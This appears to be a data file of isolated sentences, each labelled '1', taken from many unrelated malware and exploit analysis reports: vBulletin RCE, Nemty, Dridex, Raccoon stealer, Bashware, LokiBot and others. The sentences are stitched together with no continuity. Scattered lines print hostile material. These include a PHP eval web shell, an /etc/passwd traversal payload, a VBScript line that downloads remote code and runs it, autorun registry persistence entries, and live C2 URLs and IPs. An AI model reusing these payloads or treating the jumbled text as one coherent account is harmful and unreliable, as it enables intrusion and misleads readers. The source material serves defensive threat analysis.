1	The module checks every new file this hash storage, and skips the file that were already processed.
1	All information including collected file names and contents is stored in its encrypted log files (%TMP%smrdprevsmrdprev_%p_%p.tmp).
1	By exploiting this vulnerability, an attacker could have gained privileged access and control over any vBulletin server running versions 5.0.0 up to 5.5.4, and potentially lock organizations out from their own sites.
1	The exploits are a bypass of the fix for the previous vulnerability, CVE-2019-16759, which allows attackers to send a crafted HTTP request with a specified template name and malicious PHP code, and leads to remote code execution.
1	Template rendering is a functionality of vBulletin that can convert XML templates to PHP code and execute it.
1	When an attacker manipulates an Ajax request that contains template name widget_php and malicious code placed in the parameter widgetConfig[code], the render engine will convert the XML template widget_php shown in Figure 2 to a string of PHP code, then execute the code by the eval function highlighted in Figure 3.
1	In the PHP code, it can be seen that the render engine will traverse the subWidget and its config from the $subWidgets and create a new template object, after which the rendering will generate its PHP code.
1	In this case, if the string widget_php is assigned to variable subWidget and the malicious code is placed in the $widgetConfig['code'], the malicious code will be executed just like with CVE-2019-16759.
1	When the backend processes this URL, the malicious code will be executed.
1	Some attackers are trying to exploit the vulnerability and read files on the server-side.
1	The payload contains the PHP function shell_exec() for the execution of arbitrary system commands and a system command cat ../../../../../../../../../../etc/passwd to read the content of the /etc/passwd.
1	Writing Web Shell
1	Some attackers are exploiting the vulnerability to install a web shell.
1	Figure 16 shows that the exploit is trying to write a PHP-based web shell <?php @eval($_POST[x]);?> to the file conf.php on the web host directory with the PHP function file_put_content().
1	Once the attack succeeds, attackers can send their commands via HTTP POST request with the parameter x to the web shell and execute the commands on the server-side.
1	Figure 17 shows that the exploit is trying to download a PHP script onto the victim server.
1	Figure 18 shows that the exploit is trying to write base64 encoded PHP code into a file in the web host directory.
1	Downloading Shellbot
1	Some attackers are utilizing the vulnerability to download a Perl-based script malware (Shellbot) with the PHP function shell_exec() for the execution of the system command wget from the address http://178[.]170[.]117[.]50/bot1 and run it.
1	Once the script is executed, it will connect to an IRC-based command-and-control (C2) server with the address of 66[.]7[.]149[.]161:6667, join the IRC channel #afk then keep responding to the PING from the server, as in the traffic shown in Figure 20.
1	Once it receives the commands from the chat channel, it will execute the related code of port scanning, download files, execute system commands, start a flood attack, pop a shell to attackers and so on.
1	Traffic during the execution of the ShellBot script
1	Downloading Sora
1	One exploit is found to download a Mirai variant (Sora) from the attackers server.
1	According to analysis of the samples, they spread themselves with different combinations of the exploits of CVE-2020-5902 (which would be ineffective, as the payload uses bash commands, whereas the exploit requires the injected commands to be specific CLI-compatible ones), CVE-2020-1937, CVE-2020-10173, CVE-2020-10987, Netgear R700 RCE, Netlink GPON Router 1.0.11 RCE and the vulnerability CVE-2020-17496 discussed in this blog.
1	Nemty ransomware uses a combination of AES-128 in CBC mode, RSA-2048, and the unusual RSA-8192 for its file encryption and key protection.
1	Generate a 32-byte value using a pseudo-random algorithm.
1	This value is added to theconfigurationinformation later on.
1	The first 16 bytes are used as the main AES key for file encryption.
1	Function to generate random characters
1	Generate an RSA-2048 key pair.
1	Decrypt and import the embedded RSA-8192 Public Key using the same RC4-base64 function.
1	Embedded RSA-8192 Public Key
1	Include the generated Private Key from step 2 to the configuration file, which also contains other information gathered from the system (discussed in the next section)
1	Encrypt theconfigurationfile using RSA-8192 Public Key imported in step 3 and encode it in base64.
1	Generate another 16-byte key using the same algorithm used in step 1.
1	Encrypt the file content using the main AES Key from step 1 and the current IV.
1	Encrypt the current IV using RSA-2048 with the locally generated Public Key generated in step 2 and encode it in base64.
1	Append the encrypted IV to the file.
1	The confusion continues when it checks to see if the IP address of the victim is located in Russia, Belarus, Kazakhstan, Tajikistan, or Ukraine by accessing hxxp://api.db-ip.com/v2/free/{IP address}/countryName.
1	The information is assembled and written in JSON format to %USERPROFILE%/{FileID}.nemty, wherein the FileID is _NEMTY_{7 random characters} (e.g._NEMTY_NIZ8NSt_.nemty).
1	In generating the random characters, it uses the same algorithm used in generating the AES Key and IVs.
1	A combosquatting domain mimicking Samsung (samsungeblyaiphone[.]com) hosts Azorult malware 5acd6d9ac235104f90f9a39c11807c37cdfb103d6c151cc1a2e4e38bf3dbe41f on the URL samsungeblyaiphone[.]com/dolce.exe.
1	Once the malware executes, it will generate a unique identifier for the compromised machine based on the machines globally unique identifier and username.
1	Then the malware will contact the C2 server with this identifier, and it will retrieve the configuration of the infected machine, including the running processes and services.
1	Additionally, Azorult malware often downloads payload from other compromised servers.
1	The new payload can collect and send out sensitive data such as cookies, browser credentials and cryptocurrency information.
1	Analyzing the malware sample downloaded from samsungeblyaiphone[.]com, we found that it attempted to send a POST request to samsungeblyaiphone[.]com/index.php, which is consistent with this malware familys known behavior to exfiltrate data.
1	First, the malware resolved these domains to the same IP address 217.182.227[.]117.
1	Then, it communicated through SSL traffic with the same JA3 (SSL fingerprint): 6312930a139fa3ed22b87abb75c16afa on client-side and 4192c0a946c5bd9b544b4656d9f624a4 on server-side.
1	Depending on the browser used, it redirects users to landing pages offering different types of PUPs for download.
1	While using Chrome, we get a click continue and install extension page, as shown in Figure 10.b, which redirects users to the Chrome store for the Security for Chrome extension.
1	Redirection to PUP installation in Safari from walrmart44[.]comFigure 10.b.
1	Redirection to PUP installation in Chrome from walrmart44[.]comFigure 10.c.walrmart44[.]com blocks crawlers when visited too frequently.
1	A combosquatting domain mimicking Samsung (samsungpr0mo[.]online) looks like a legitimate Australian educational news website with a valid SSL certificate.
1	Clicking on the warnings, users are redirected to a fake virus scanning page, which recognizes their operating system to increase credibility but will always display the same list of detected viruses (Figure 11.b).
1	Finally, clicking the Proceed button takes users to a download page for a system repair tool, which is legitimate but potentially unwanted.
1	A fake virus scanning page displays after clicking on a warning message from samsungpr0mo[.]online
1	Finally, users are redirected to a survey and then to a re-bill scam page (Figure 13.d).
1	A fake Netflix main page hosted on netflixbrazilcovid[.]com
1	This malicious HWP file contains link object, a technique that was introduced in previous blog post, and it is assumed that the malicious document was created in the system that acquires the PC name of Snow via path information where the object was inserted (C:\Users\Snow\AppData\Local\Temp).
1	Upon running the document in the file path that matches the condition and clicking the object that is wrapping the in-file window, TroubleShooter.bat in the file path below is run from the malicious HWP file.
1	The file that actually executes malicious behavior is HncConfig.ini file which attempts to connect to the additional malicious URL; however, it is not possible to confirm the malicious behavior that takes place afterward, because data cannot be received from the network at this time.
1	Created File %TEMP%\TroubleShooter.bat
1	start /min %temp%\Diagnostics.bat %TEMP%\Diagnostics.bat
1	start wscript //b //e:vbscript %temp%\HncConfig.iniexit %TEMP%\HncConfig.ini
1	On Error Resume Next:Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0"):x.open "GET", "http://yegip.kr/se2/photo_uploader/plugin/update/list.php?query=0", 0:x.Send:rt=x.responseText:Execute(rt)
1	The file that actually executes malicious behavior is HncConfig.ini file which attempts to connect to the additional malicious URL; however, it is not possible to confirm the malicious behavior that takes place afterward, because data cannot be received from the network at this time.
1	Order of execution: TroubleShooter.bat > Run Diagnostics.bat > Run HncCongif.ini > Connect to malicious URLMalicious URL : hxxp://yegip.kr/se2/photo_uploader/plugin/update/list.php?query=0
1	The resulting functionality downloads the file from the URL and writes it to javaln.exe.
1	This transfer decryption routine returns a URL that is concatenated with the other variables, resulting in hXXp://www.hotinfonews.com/news/dailynews2.php?id=&t=win.
1	It is this content that is written to disk and executed on the victims machine.
1	2nd stage of the attack: EXE, downloader
1	The second stage of the attack is downloaded from http://www.hotinfonews.com/news/dailynews2.php and executed by the payload of the Java exploit.
1	Known file location: %TEMP%javaln.exe
1	The module creates a mutex named MtxJavaUpdateSln and exits if it already exists.
1	After that, it sleeps for 79 seconds and then creates one of the following registry values to be loaded automatically on startup: 
1	[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]JavaUpdateSln=%full path to own executable%
1	[HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun]JavaUpdateSln=%full path to own executable%
1	Then, after a 49 second delay, it enters an infinite loop waiting for a working Internet connection.
1	Every 67 seconds it sends a HTTP POST request to the following sites: www.microsoft.com, update.microsoft.com, www.google.com, Once a valid connection is established, it continues to its main loop.
1	Every 180 seconds the module sends a HTTP POST request to its C&C server.
1	The request is sent to a hardcoded URL: www.dailyinfonews.net/reportdatas.php
1	HTTP POST request sent to the C&C server
1	The module decrypts the C&C response with AMPRNG algorithm using a hardcoded key.
1	Then, it checks if there is a valid EXE signature (MZ) at offset 37 in the decrypted buffer.
1	If the signature is present, it writes the EXE file to %TEMP%nvsvc%p%p.exe (%p depends on system time) and executes it.
1	When any victim views this post, the XSS code will be executed in their browser.
1	If the victim happens to have admin rights, the criminal could then exploit this vulnerability to gain control of the administrators account, leverage the WordPress built-in function to GetShell, then take control of the server.
1	For example, the attacker could host a JavaScript file, such as wpaddadmin[.]js (described in the link), on their web server.
1	This JavaScript code will add a WordPress administrator account with the username attacker and password attacker.
1	Once a victim with high permission views this post, the administrator account attacker will be created.
1	The attacker account with administrator permission created by the XSS code
1	The attacker could then modify an existing php file to a webshell and use the webshell to take control of the webserver.
1	Inserting XSS code to add an administrator account
1	The mail had an Excel file attached.
1	The excel document contains a blurry image which prompts the user to click it.
1	The included images are connected with the VBA macro code.
1	Upon clicking them, the macro code function VIEW_DOCUMENT is immediately run.
1	The attacker used both VBA and the XLM macro codes.
1	The attacker made it impossible to check the VBA codes by adding a password on the VBA Project.Tool such as oletools can be used to extract VBA codes, but it is difficult to figure out what the feature is just by looking at the obfuscated codes shown below.
1	The attacker is highly likely to have used VBA Project Locker such as Evilclippy.
1	Upon debugging the VBA macro code, we can see that it is referencing the cell of XLM macro sheet and using it as data.
1	The data is used for the process of creating codes for external URL connection, which are the final feature of the excel document file.
1	A total of 57 URLs are created, and multiple unobfuscations are needed in this process.
1	After creating the URL list, the document connects to a random address and attempts to download a file.
1	The downloaded file is a DLL executable (Portable Executable), but it uses a compressed file extension such as .rar, .tar, or .zip instead of the dll file extension.
1	The downloaded file is saved as a fixed DLL file name.
1	If the file is successfully downloaded, it runs the obfuscated CALL function as shown above.
1	This is a command which runs the downloaded Dridex DLL file using the Regsvr32.exe process.
1	If this process is run, Dridex malware is loaded in the Regsvr32.exe process and operates in the system.
1	Connecting to the C&C server below is the core feature.
1	The users information such as system information is sent in this process.
1	hxxs://210.65.244.176/
1	hxxps://37.34.58.210:6601/
1	As you can see in the prologue of the TestCreateProcess() function, the server first impersonates the caller process  typically the client application with lower privilege will trigger this RPC API given that the remaining operation will be executed under the caller context.
1	The code labelled at (1) indicates that the caller would like to run notepad.exe at a medium integrity level.
1	As a result, a fake target executable  in this example notepad.exe  will be spawned with elevated privilege by the server process through the CreateProcess() API.
1	Cetus disguises itself by impersonating a legitimate binary that is frequently used in Docker environments called Portainer.
1	Portainer is a user interface (UI) management tool that offers a convenient way to manage multiple Docker environments.
1	While taking over a new machine, Cetus copies itself to the victim and deploys an XMRig cryptominer payload.
1	Cetus disguises the cryptominer as a different legitimate binary called docker-cache.
1	Cetus uses Masscan to randomly scan subnets for Docker daemons and, once it finds one, it tries to spread by sending requests to daemons REST API.
1	To add insult to injury, Cetus crafts these requests by using the Docker command line interface (CLI) tool.
1	Add Cetus to /root/.bash_aliases.
1	It will cause Cetus to run every time the container restarts or root starts a bash session:
1	It opens /var/log/stmp.log in order to log Cetuss actions, and after that, it runs the XMRig cryptominer, which utilizes the machines CPU in order to mine Monero.
1	It picks a random 16-bit subnet and runs Masscan in order to scan the subnet for Docker daemons on port 2375.
1	When it finds a daemon, it starts the infection process using the Docker CLI tool that was already downloaded.
1	The miner will identify itself to the mining pool with this name and send the actor information about the mining.
1	Once ExpensiveWall is downloaded, it requests several common permissions, including internet access  which allows the app to connect to its C&C server  and SMS permissions  which enable it to send premium SMS messages and register users for other paid services all without the users knowledge.
1	After it is installed and granted the necessary permissions, ExpensiveWall sends data about the infected device to its C&C server, including its location and unique identifiers, such as MAC and IP addresses, IMSI, and IMEI.
1	Each time the device is switched on, or experiences a connectivity change, the app connects to its C&C server and receives a URL, which it opens in an embedded WebView.
1	The malware obtains the devices phone number and uses it to subscribe the user to different paid services, such as the example below:
1	In other cases, the malware presents the user with a button called Continue, and once the user clicks the button, the malware sends a premium SMS on his behalf.
1	During lateral movement in a victims network, the attackers deploy a module to actively scan the local area network, find hosts vulnerable for MS08-067 (the vulnerability exploited by Conficker) or accessible with admin credentials from its own password database.
1	The malicious code was delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF documents) which were rigged with exploit code for known security vulnerabilities in the mentioned applications.
1	In addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it appears that the attackers also infiltrated victim network(s) via Java exploitation (known as the Rhino exploit (CVE-2011-3544).
1	Right after the victim opened the malicious document or visit malicious URL on a vulnerable system, the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers.
1	Next, the system receives a number of additional spy modules from the C&C server, including modules to handle infection of smartphones.
1	All gathered information is packed, encrypted and only then transferred to the C&C server.
1	As a notable fact, the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins.
1	The only thing that was changed is the executable which was embedded in the document; the attackers replaced it with their own code.
1	The embedded executable is a file-dropper, which extracts and runs three additional files.
1	%TEMP%MSC.BAT
1	%ProgramFiles%WINDOWS NTLHAFD.GCP (<- This file name varies)
1	%ProgramFiles%WINDOWS NTSVCHOST.EXE
1	This file is essentially a backdoor, which is decoded by the loader module (svchost.exe).
1	The decrypted file is injected into system memory and is responsible for communication with the C&C server.
1	On any infected system, every major task is performed by the main backdoor component.
1	The main component is started only after its loader (svchost.exe) checks if the internet connection is available.
1	After the Internet connection is validated, the loader executes the main backdoor component that connects to its C&C servers:
1	Capture of malwares communication with the C2
1	The connections with the C&C are encrypted  different encryption algorithms are used to send and receive data.
1	After a connection with the C&C server is established, the backdoor starts the communication process, which leads to the loading of additional modules.
1	Offline: exists as files on local disk, capable of creating its own system registry keys, local disk log files, and may communicate with C&C servers on their own.
1	Online: exists only in system memory and is never saved to local disk, do not create registry keys, all logs are also kept in memory instead of local disk and sends the result of work to the C&C server using own code.
1	The document may be sent to the victim via e-mail.
1	However, like with exploit case, the document will be instantly processed by the module and the module will start a malicious application attached to the document.
1	This trick can be used to regain access to the infected machines in case of unexpected C&C servers shutdown/takeover.
1	The script responsible for redirections was found in /root/scp.pl and relies on the socat tool for stream redirection.
1	For instance, the script /cgi-bin/nt/th is being used to receive commands from the command-and-control server, usually in the form of new plugins to run on the victims computer.
1	The /cgi-bin/nt/sk script is called by the running plugins to upload stolen data and information about the victim.
1	When connecting to the C&C, the backdoor identifies itself with a specific string which includes a hexadecimal value that appears to be the victims unique ID.
1	Step 1: Loading WSL components
1	This way, by running a single command line silently in the background, invisible to the user, Bashware loads the WSL components and is ready to move on to the next step.
1	Step 2: Enabling developer mode
1	However, its a little known fact that all it takes to enter developer mode is setting these registry keys:
1	HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ AppModelUnlock \ AllowAllTrustedApps
1	HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ 
1	Once Bashwares operations are complete, the keys are turned back off making this operation practically invisible.
1	Step 3: Installing Linux
1	The next step for Bashware is to download and extract the Linux file system from Microsofts servers.
1	The user management installation is done by Lxrun, using the /install option.
1	Lxrun command-line interface downloads and installs the file system on Windows PC.
1	Bashware uses the Lxrun.exe utility, which downloads the Linux file system from Microsoft servers.
1	Step 4: Wine
1	Bashware uses the Winehq project capabilities and installs a pre-optimized wine project into the WSL Linux environment.
1	Next, EXE formats need to be converted by Wine, turning its NT syscalls to POSIX syscalls.
1	Later on, the Pico provider (lxcore.sys) will convert these POSIX syscalls back to NT syscalls, turning lxcore to the actual caller of this process.
1	This way, a file running on the Windows OS can execute any known malicious payload from the Linux OS, where it remains hidden from most security products.
1	During WSLs installation process, LxRun.exe is responsible for downloading and extracting the Linux file system from Microsofts servers.
1	Under the hood, the filesystem is saved in a hidden folder under %APPDAT% directory as a file named lxss.tar.gz.
1	After saving the filesystem archive, LxRun.exe then continues to extract it into the same directory.
1	After this task is finished, the hidden folder contains a full Linux file system, later used by WSL, and more specifically by BASH.exe.
1	Luckily for us, Microsoft calculates a SHA256 for the downloaded file system, which saves the hash value into a file right after the download process is complete and before extraction begins.
1	When a user wishes to use WSL, he runs Bash.exe, which is executed with the users permission.
1	In every WSL run, NTFS partitions are automatically mounted under /mnt in the Linux environment, granting the ability to read write and execute NTFS from within the WSL.
1	Figure 4: Trying to write a file into System32 directory from within the Linux environment  unprivileged Bash.exe
1	If a threat actor utilizes an admin token to launch Bash.exe, then Bash.exe + children will execute with full Admin token, including all privileges causing UAC bypass on the Windows side and full privilege escalation on the Linux side.
1	WSL contains both user mode and kernel mode components:
1	User mode session manager service, which handles the Linux instance life cycle (LxssManager.exe).
1	Pico provider drivers (lxss.sys, lxcore.sys) that emulatea Linux kernel by translating Linux system calls.
1	Pico processes (Minimal processes) that host the unmodified Linux executable (e.g./bin/bash).
1	Despite being virtually empty if examined from within the Windows OS, Pico processes have the ability to interact with a WindowsNT Kernel.
1	The interaction is achieved by the Pico provider  a special driver which is responsible for the transition from Linux ELF to a running Windows executable.
1	WSL uses Pico processes as containers for native Linux binaries.
1	Pico processes are being monitored and serviced by a kernel component called Pico Provider (implemented in lxcore.sys).
1	The Pico Provider driver dispatches system calls and user mode exceptions made by the various Pico Processes.
1	WSL executes unmodified Linux ELF64 binaries, by virtualizing a Linux kernel interface on top of the WindowsNT kernel.One of the kernel interfaces that it exposes are system calls (syscalls), a service provided by the kernel that can be called from user mode.
1	The Windows Subsystem for Linux includes kernel mode drivers (lxss.sys and lxcore.sys).
1	When a syscall instruction is made, the NT kernel detects that the request came from a Pico process.
1	Since the NT kernel does not know how to handle syscalls from Pico processes, it saves off the register state and forwards the request to the Pico driver (lxcore.sys).
1	After the Pico driver has handled the syscall, it returns to the NT Kernel, which restores the register state, places the return value in rax, and invokes the sysret\iretq instruction to return to user mode.
1	While running the Bash terminal, there are numerous procedures running under the hood of Windows OS:
1	exe  a Windows launcher service that communicates with the LxssManager.exe and spawns a new instance of WSL, executing the desired process.
1	exe  a user-mode management service (the LxssManager.dll service living in SVCHOST.exe), which provides an external-facing COM interface, passing information to the Pico Provider through its Device Object.
1	Pico Provider driver (LXSS.SYS / LXCORE.SYS) which provides the kernel-mode implementation of a Linux-compatible Kernel ABI and API, as well as a Device Object (\Device\lxss) for command & control.
1	This Linux instance enables running ELF binaries through an interface which lxcore.sys exports.
1	Lxcore.sys intercepts all ELF syscalls and adapts them into NT syscalls.
1	The LokiBot sample [SHA256: 691c65e4fb1d19f82465df1d34ad51aaeceba14a78167262dc7b2840a6a6aa87] has a file size of 286 KB and was recently compiled on Aug 21, which is coincidentally the same date as when the malicious spam was sent.
1	The file creates a directory %appdata%\[6 random hex chars]
1	It will then: add attribute FILE_ATTRIBUTE_HIDDEN, add attribute FILE_ATTRIBUTE_SYSTEM, add attribute FILE_NOT_CONTENT_INDEXED, copies itself to %appdata%\[6 random hex chars]\[6 different random hex chars]\.exe, add attribute FILE_ATTRIBUTE_HIDDEN, add attribute FILE_ATTRIBUTE_SYSTEM, add attribute FILE_NOT_CONTENT_INDEXED, create mutex: 2B1733F511B2DFE5171B9AA1
1	Once these changes are made, it then deletes itself.
1	Ultimately, it will connect via POST: hxxp://palikyu.ml/alpha/fre.php, 104.31.95.221 (aug 22, 2019 CloudFare Inc.), Palikyu.ml and Palikyu.tk
1	Another interesting behavior to note is that the domain contacts Palikyu.ml  specifically, hxxp://palikyu.ml/alpha/fre.php (104.31.95.221).
1	RFQE67Y54.7z file
1	T1204: User Execution - File is unzipped and executed by user via deception (LokiBot)
1	T1107: File Deletion - deletes original file after infection
1	T1158: Hidden Files and Directories - creates custom directory %appdata%\[6 random hex chars] with the following attributes
1	T1158: Hidden Files and Directories - creates custom directory %appdata%\[6 random hex chars] with the following attributes
1	moves self to %appdata%\[6 random hex chars]\[6 different random hex chars].exe with the following attributes:
1	T1045: Software Packing - threat comes packed/encrypted
1	T1003: Credential Dumping
1	T1081: Credentials in Files
1	Threat tries to steal credentials from various software programs
1	T1214: Credentials in Registry
1	Threat tries to steal credentials from various software programs
1	T1005: Data from Local System
1	Threat tries to steal credentials from various software programs
1	T1002: Data Compressed
1	Threat compresses stolen data before sending it over to URL
1	T1043: Commonly Used Port
1	Threat uses port 80 for communications (hxxp://palikyu.ml/alpha/fre.php)
1	T1071: Standard Application Layer Protocol
1	Threat uses standard HTTP over port 80 (hxxp://palikyu.ml/alpha/fre.php)
1	Known Defenses and Mitigations
1	Initial Access: FortiMail or other mail solutions can be used to block specific file types.
1	The first interesting function that is executed is _attachBaseContext(Context base).
1	This function accesses the configuration file contained in the asset folder of the APK.
1	Figure 1: Creation of fake Dex files
1	It then checks the payloadType value, and if the value is equal to 1, it will copy the asset data to another folder.
1	Otherwise, it will proceed without moving anything, as it uses the classes.dex file loaded in memory instead.
1	Figure 2: Extraction of Dex encrypted file
1	The native JNI_OnLoad function, which is run when the library is loaded, registers the native functions declared in JNITools, allowing them to be called differently than the usual scheme of Java_<className>_<FunctionName>, probably to make the reversing process harder.
1	If the value of the configuration variable type is different from 0 (which means the payload needs to be decrypted), the code accesses the folder /data/data/<appname>/app_csn0/ and creates a folder .unzip in it.
1	The decryption routines are run on a file generated from the encrypted payload data.
1	In the first case, the packer accesses the /proc/<pid>/maps file to locate the memory where the classes.dex file is loaded, and then looks for a specific set of characters in memory that identify the beginning of the encrypted data.
1	When found, it starts copying from that point onwards.
1	These routines then generate a classes.dex payload file that is loaded by the ClassLoader.
1	In the sample analysed, the payload consisted of two .dex files.
1	The server address is not hardcoded in the `classes.dex` file, but it is retrieved during execution.
1	The code executes the function `GprcsUtils.Regist_Server(String str)`, which calls `UrlTool.loadIPAddrFromIns()` to extract the C2 URL.
1	Figure 8: Loaded IP from Instagram
1	Much like Anubis used to do with fake Telegram and Twitter accounts, this malware uses social media to obtain its C2: it downloads the webpage of a photo-less Instagram account.
1	It then extracts the biography field of this account and decodes it using Base64.
1	Figure 9: Fake Instagram account
1	Finally, the resulting string is decrypted using DES and a key is generated using the value `d2a57dc1d883fd21fb9951699df71cc7` as its seed (which happens to be the MD5 hash corresponding to the word app), which can be seen in figure 8 under the String variable str3.
1	The resulting URL is 149.28.24.166:11257 and the fake accounts have been reported to Instagram.
1	After the connection to the server is started, the malware proceeds to collect and send the following information about the device:
1	After having sent all of the devices contacts to the C2, it waits for it to respond with a telephone number and a message body to construct an SMS.
1	It is interesting to note that the malware identifies the provider of the SIM card and looks specifically for a specific Japanese telecommunication provider.
1	To do so, it checks the IMSI (International Mobile Subscriber Identity) value of the device.
1	The malware checks to see if the first half corresponds one of its listed values, which are all connected to the aforementioned provider.
1	Figure 10: Checking if the device is served by a specific provider
1	Instead, if the function `is<Provider>()` returns true, then the malware simply proceeds to increase the value controlling the maximum number of SMS messages it allows itself to send.
1	Finally, the malware is able to set itself as the default SMS handler application, and uses this to upload to the C2 all the received messages.
1	This malicious Word document file takes a form of a Compensation Request Form, and what is different from existing file is that it performs malicious External connection and uses VBA macro simultaneously.
1	As shown in the Figure 1 (document.xml.rels), it attempts to connect to the malicious URL specified as External, and operates the malicious VBA macro configured in settings.yml which is situated within the document.
1	External malicious URL: hxxp://ftcpark59.getenjoyment.net/1703/blank.php?v=sakimName of the file with VBA macro code: settings.yml
1	Normally, when a VBA macro is created within a Word file, a file named vbaProject.bin is created, but it is speculated that for this malicious Word file, the attacker intentionally made it with filename of settings.yml.
1	This document file was created to prompt users to enter personal information and account number for retrieval of the compensation.
1	ASEC analysis team believe that the attacker intentionally designed the document this way to prompt user to enable malicious behaviors.
1	Configure office security settings so that the macro can be executed at all times (Registry value change).
1	Upon accessing the URL, transmit (leak) information including names of running services and processes.
1	Malicious URL to access macro: hxxp://ftcpark59.getenjoyment.net/1703/v.php?w=sakim&v=Extract names of running services and processes then attempt to connect after respectively attaching extracted information behind the URL (URL/Service Name/Process Name)
1	It is assumed that the malware will follow the attackers directive and download additional file in certain environment where C2 is connected.
1	The process of getting the server address is as follows:Like most of the credential stealers, the client (i.e.the attacker) can customize his or her own configuration for the stealer functionality, which can be saved in the binary built by the malware or in the C&C server, and sent back to the malware when executing.
1	In Raccoon, after the client chooses the configuration, the malware builder generates a configuration ID for the clients configuration and writes this ID to the compiled malware.
1	In this case, the config ID is encrypted, Raccoon has another hardcoded base-64 encoded string in the binary.
1	To decrypt the config ID, it uses the first key ([emailprotected]*@45) and, after the decryption routine, gets the config ID (which is, in this case, 4ede41fe0ea963034a3d65f0dd442de4671c214f).To get the full configuration, the stealer has to query the C&C.
1	The C&C server returns JSON that contains the configuration the stealer needs for its functionality.
1	Raccoon targets a wide range of applications and uses known techniques in order to extract sensitive data from those applications.
1	In order to extract and decrypt the credentials from the applications, Raccoon downloads the specific DLLs for the applications.
1	The config JSON contains a URL from where the malware will download those libraries.
1	Most of the stealers, like Raccoon, perform SQL queries using sqlite3.dll in order to get the user autologin passwords, credit card information, cookies and browser history.
1	The stealer also relies on the same methodology for Mozilla based applications.
1	The stealer targets four Mozilla-based browsers including Firefox and SeaMonkey, (full list below) and one Mozilla-based email client, ThunderBird.
1	For those applications, the stealer extracts and decrypts sensitive data like username and password, cookies and history.
1	In order to do so, Raccoon downloads a zip file containing a lot of DLLs for decrypting protected data.
1	By using functions from nss3.dll, the malware is able to decrypt and extract the data from the SQLite databases and the JSON login file.
1	When looking for cryptocurrency wallets, Racoon targets popular applications like Exodus, Jaxx and more.
1	Like most stealers, Raccoon is looking for those wallet files in the default application locations, but it also has a wallet scanning feature that allows it to grab any wallet.dat file.
1	The malware gathers information about the machine like the OS arch and version, system language, hardware information and installed applications.
1	In addition, it can take screenshots from the users machine if that was enabled by the attackers configuration.
1	After fulfilling all its stealing capabilities, Raccoon gathers all the files that it wrote to the temp folder into one zip file named Log.zip.
1	Now all it has to do is send the zip file back to the C&C server and delete all traces of itself.
1	It downloads malicious files and runs them.
1	In this case, the dropper feature is disabled by the config JSON, but when it is enabled, Raccoon takes the URLs from the loader_urls key, downloads the file to the temp folder and executes it by calling to ShellExecuteA with the file path.
1	Since we started the analysis of this sample, the Raccoon team members have improved the stealer and released new versions for the build, including the apability to steal FTP server credentials from FileZilla application and login credentials from a Chinese UC Browser.
1	In addition, the attacker panel has been improved, some UI issues were fixed and the authors added an option to encrypt the builds right from the panel and downloaded it as a DLL.
1	A Flash exploit targeting the vulnerability labeled CVE-2015-5119.
1	It allows an attacker to execute arbitrary code remotely, if the attacker can convince the potential victim to open a specially crafted Flash file.
1	Strikingly, the exploit works against all major browsers and can also be deployed easily in Microsoft Office documents (Word, Excel, PowerPoint).
1	Hacking Teams leaked data contain various tools for easy manipulation of the Flash exploit, and therefore it does not come as a surprise that various exploit kits integrated it very rapidly, as reported by the security researcher Kafeine.
1	This exploit allows an attacker to execute a program with maximum privileges.
1	Hence, the Hacking Team leak provides a complete exploitation chain, starting from a Flash exploit for the compromise, to a Windows escalation privilege exploit allowing the payload execution with elevated privileges.
1	The target receives a spear-phishing email containing an URL pointing to a domain name mimicking a legitimate domain name.
1	In this particular case, we observed the domain osce-press.org being used, which mimics osce.org/press.
1	If the target opens the URL, the browser hits a landing page with JavaScript code, which collects detailed information on the computer.
1	If the computer matches certain criteria set by the Sednit operators (language, timezone), the server then serves an exploit to the target.
1	Since Wednesday, a Flash exploit is delivered under the name flash_video_x86.swf.
1	The decompiled code of the exploit is almost the same as the Hacking Team exploit  more precisely, the version dubbed scratch_ie_ff_bytearray in the leaked data.
1	The only difference between the two exploits appears to be that the Sednit version receives the shellcode to execute in an input parameter in a manner similar to Metasploit exploits, whereas in the Hacking Team version the shellcode is hardcoded in the Flash file.
1	If the Flash exploitation works, the victim receives a first-stage backdoor  malware whose purpose is to make sure the victim is the intended target.
1	This malware contains Hacking Teams Windows escalation privilege exploit.
1	If the privilege escalation exploit works, the malware then sets its persistence on the machine through a scheduled task running with the highest privileges.
1	One of our users notified us of a suspicious document in the archive which is detected by our anti-malware products as Exploit.JS.Pdfka.ffw.
1	Technical Details  964.PDF
1	The targeted e-mail contains a PDF file named 964.PDF, which is 569,477 bytes in size (MD5: cbf76a32de0738fea7073b3d4b3f1d60).
1	This PDF file contains an exploit (CVE-2010-0188) for Adobe Reader 8.x before 8.2.1 and 9.x before 9.3.1.
1	The PDF has an embedded Javascript code which exploits the vulnerability and passes execution to the shellcode.
1	When the shellcode is executed, it parses the command line of the current process (Adobe Reader), skips the first substring surrounded with double quotes and extracts the second substring surrounded with double quotes character.
1	Next, it copies the source PDF to %TEMP%1.dat and reads the 1.dat file.
1	It reads 0x8A218 bytes (this value is hardcoded) from offset 0xD98 (hardcoded as well).
1	This new data block starts from a size of a payload stored in DWORD value of 0xCF00.
1	The first part of the payload is decrypted using simple ROL+XOR (position-dependent).
1	The decrypted file is saved into %TEMP%explorer.exe and then it is executed.
1	Right after that, the second part of the payload is similarly decrypted.
1	It is dumped to %TEMP%964.PDF (file name is hardcoded).
1	After this, the shellcode spawns a new Adobe Reader process to open the dumped PDF file, removes %TEMP%1.dat and terminates the current process.
1	The malware dropped by the PDF exploit is detected by Kaspersky Lab products as Trojan-PSW.Win32.Quarian.j.
1	After start of execution the malware installs current module in system Autorun using the following registry value:
1	HKCUSOFTWAREMicrosoftWindowsCurrentVersionRunalg = %Path to Self%
1	To ensure there is single instance of current application, it creates a mutex named windowsupdataguoDL, if it failed to create the mutex and the last error is ERROR_ALREADY_EXISTS it instantly stops execution.
1	The malware also attempts to read first 4 bytes from file named cf (in the current directory).
1	Next, it decrypts hardcoded C&C server address using simple XOR (with position and value 0x44) and starts a new C&C communication thread.
